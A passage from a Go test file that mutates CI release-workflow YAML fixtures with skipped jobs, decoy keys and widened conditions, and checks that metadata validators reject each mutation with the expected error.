		validate                               func(string) error
	}{
		{"unmodelled job key", release, "  publish-github-release:\n", "  publish-github-release:\n    snapshot: decoy\n", "field snapshot not found", metadatautil.ValidateReleaseWorkflowPublicationGate},
		{"unmodelled step key", release, "      - name: Recheck hosted controls and publish GitHub release assets\n", "      - name: Recheck hosted controls and publish GitHub release assets\n        decoy: true\n", "field decoy not found", metadatautil.ValidateReleaseWorkflowPublicationGate},
		{"publish job skipped", release, "  publish-github-release:\n", "  publish-github-release:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowPublicationGate},
		{"verify job skipped", release, "  verify-release-outputs:\n", "  verify-release-outputs:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowPublicationGate},
		{"release job skipped", release, "  release:\n", "  release:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowAuthoritySplit},
		{"upstream publish job skipped", upstreamRefreshWorkflowFixture, "needs: [refresh, scope-guard]\n" + onCandidate, "needs: [refresh, scope-guard]\n    if: false\n", "publish job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
		{"upstream scope-guard condition widened", upstreamRefreshWorkflowFixture, "needs: refresh\n" + onCandidate, "needs: refresh\n    if: always()\n", "scope-guard job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			if err := testCase.validate(testCase.workflow); err != nil {
				t.Fatalf("unmutated workflow rejected: %v", err)
			}
			mutated := strings.Replace(testCase.workflow, testCase.old, testCase.replacement, 1)
			if mutated == testCase.workflow {
				t.Fatal("mutation left the workflow unchanged")
			}
			if err := testCase.validate(mutated); err == nil || !strings.Contains(err.Error(), testCase.want) {
				t.Fatalf("validate() error = %v, want %q", err, testCase.want)
			}
		})
	}
}
